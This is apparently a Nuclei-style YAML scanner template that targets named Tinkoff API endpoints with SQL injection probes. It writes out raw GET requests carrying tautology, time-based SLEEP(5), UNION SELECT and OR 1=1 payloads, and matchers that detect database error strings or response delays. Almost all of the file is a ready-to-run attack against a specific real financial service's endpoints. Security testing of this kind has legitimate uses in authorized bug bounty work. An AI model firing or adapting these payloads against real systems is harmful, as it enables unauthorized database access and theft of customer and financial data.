id: tinkoff-sqli

info:
  name: Tinkoff - SQL Injection
  author: bugbounty
  severity: critical
  description: SQL injection in API endpoints with filtration and ID parameters
  tags: sqli,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=1' OR '1'='1 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/common/v1/session_info?platform=web' AND SLEEP(5)-- -&sessionid=test HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/invest/portfolio/instruments/v2?tickers=AAPL' UNION SELECT NULL-- - HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/invest-gw/social/v1/post?id=1' OR 1=1-- - HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "PostgreSQL"
          - "ORA-"
          - "syntax error"

      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and
